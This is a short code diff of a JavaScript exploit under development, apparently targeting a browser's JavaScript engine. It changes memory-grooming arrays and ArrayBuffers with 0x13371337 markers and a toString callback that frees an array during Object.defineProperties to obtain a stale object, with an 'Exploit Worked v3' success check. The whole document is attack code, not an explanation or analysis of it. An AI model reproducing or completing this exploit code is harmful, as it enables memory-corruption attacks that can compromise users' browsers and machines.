@@ -15,11 +15,6 @@ function keep(x) {
 	setTimeout(function() { alert("shit" + x) }, 10*60*1000);
 }
 
-//keep(props);
-//keep(stale);
-//keep(target);
-
-
 
 var mem0 = 0;
 var mem1 = 0;
@@ -124,9 +119,9 @@ function go_() {
 	}
 	dgc();
 	var arr = new Array(0x100);
-	var yolo = new ArrayBuffer(0x1000);
-	arr[0] = yolo;
-	arr[1] = 0x13371337;
+	//var yolo = new ArrayBuffer(0x1000);
+	//arr[0] = yolo;
+	//arr[1] = 0x13371337;
 	var not_number = {};
 	not_number.toString = function() {
 		arr = null;
@@ -152,9 +147,7 @@ function go_() {
 	var target = [];
 	var before_len = arr.length;
 	Object.defineProperties(target, props);
-	
-	var stale = 0;
-	stale = target.stale;
+	var stale = target.stale;
 
 	if(before_len != stale.length){
 		alert("Exploit Worked v3");
